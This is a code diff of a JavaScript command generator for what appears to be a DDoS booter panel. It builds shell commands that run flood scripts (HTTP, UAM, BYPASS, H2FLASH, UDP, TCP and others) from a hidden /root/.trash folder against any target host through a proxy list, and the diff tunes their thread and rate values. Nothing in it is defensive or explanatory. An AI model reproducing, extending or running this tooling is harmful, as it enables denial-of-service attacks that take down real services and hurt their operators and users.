@@ -31,7 +31,7 @@ const generateCommand = (method, host, port, time) => {
         case 'HTTP':
             return `cd /root/.trash && node HTTP.js ${host} ${time} 32 2 proxy.txt`;
         case 'MIXBIL':
-            return `cd /root/.trash && node MIXBIL.js ${host} ${time} 8 4 proxy.txt`;
+            return `cd /root/.trash && node MIXBIL.js ${host} ${time} 16 4 proxy.txt`;
         case 'UAM':
             return `cd /root/.trash && node UAM.js ${host} ${time} 32 2 proxy.txt`;
         case 'STATRUM':
@@ -39,9 +39,9 @@ const generateCommand = (method, host, port, time) => {
         case 'H2CIKO':
             return `cd /root/.trash && node H2CIKO.js ${host} ${time} 4 64 proxy.txt`;
         case 'BYPASS':
-            return `cd /root/.trash && node BYPASS.js ${host} ${time} 8 5 proxy.txt`;
+            return `cd /root/.trash && node BYPASS.js ${host} ${time} 8 2 proxy.txt`;
         case 'H2FLASH':
-            return `cd /root/.trash && node H2FLASH.js ${host} ${time} 8 8 proxy.txt`;
+            return `cd /root/.trash && node H2FLASH.js ${host} ${time} 8 2 proxy.txt`;
         case 'H2GECKO':
             return `cd /root/.trash && node H2GECKO.js ${host} ${time} 32 2 proxy.txt`;
         case 'H2RAPID':
@@ -51,7 +51,7 @@ const generateCommand = (method, host, port, time) => {
         case 'UDP':
             return `cd /root/.trash && gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
         case 'TCP':
-            return `cd /root/.trash && gcc tcp.c -o tcp && ./tcp ${host} ${port} 2 ${time}`;
+            return `cd /root/.trash && gcc tcp.c -o tcp && ./tcp ${host} ${port} 3 ${time}`;
         default:
             return `cd /root/.trash && node ${methods[method]} ${host} ${time}`;
     }
